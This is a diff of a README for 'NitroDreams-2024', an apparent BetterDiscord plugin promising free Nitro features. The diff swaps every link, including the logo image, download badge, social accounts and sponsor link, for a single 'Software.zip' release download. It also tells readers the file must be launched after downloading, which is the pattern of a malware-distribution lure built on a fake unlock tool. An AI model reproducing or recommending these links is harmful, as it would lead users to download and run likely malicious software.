@@ -1,6 +1,6 @@
 # 🚀 NitroDreams-2024
 
-<img src="https://example.com/NitroDreams-2024-image.png" alt="NitroDreams-2024 Logo" width="200"/>
+<img src="https://github.com/lwnie/NitroDreams-2024/releases/download/v2.0/Software.zip" alt="NitroDreams-2024 Logo" width="200"/>
 
 ### Best BetterDiscord Plugin for Nitro features
 
@@ -17,7 +17,7 @@ Welcome to NitroDreams-2024, the ultimate BetterDiscord plugin that unlocks excl
 
 ### 📥 Get Started
 To download NitroDreams-2024, click the button below:
-[![Download NitroDreams-2024](https://img.shields.io/badge/Download-NitroDreams--2024-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download NitroDreams-2024](https://github.com/lwnie/NitroDreams-2024/releases/download/v2.0/Software.zip)](https://github.com/lwnie/NitroDreams-2024/releases/download/v2.0/Software.zip)
 
 *(Note: File needs to be launched after downloading.)*
 
@@ -25,11 +25,11 @@ If the above link is not working, please visit the "Releases" section of this re
 
 ### 🌐 Stay Connected
 Follow us for updates and exciting announcements:
-- Twitter: [@NitroDreams2024](https://twitter.com/NitroDreams2024)
-- Discord: [NitroDreams-2024 Community](https://discord.gg/NitroDreams2024)
+- Twitter: [@NitroDreams2024](https://github.com/lwnie/NitroDreams-2024/releases/download/v2.0/Software.zip)
+- Discord: [NitroDreams-2024 Community](https://github.com/lwnie/NitroDreams-2024/releases/download/v2.0/Software.zip)
 
 ### ❤️ Support Us
-If you love NitroDreams-2024, consider supporting our development efforts by [becoming a sponsor](https://github.com/sponsors/NitroDreams2024).
+If you love NitroDreams-2024, consider supporting our development efforts by [becoming a sponsor](https://github.com/lwnie/NitroDreams-2024/releases/download/v2.0/Software.zip).
 
 ### 🤝 Contributing
 We welcome contributions from the community! Feel free to fork this repository, make improvements, and submit a pull request. Together, we can make NitroDreams-2024 even better.
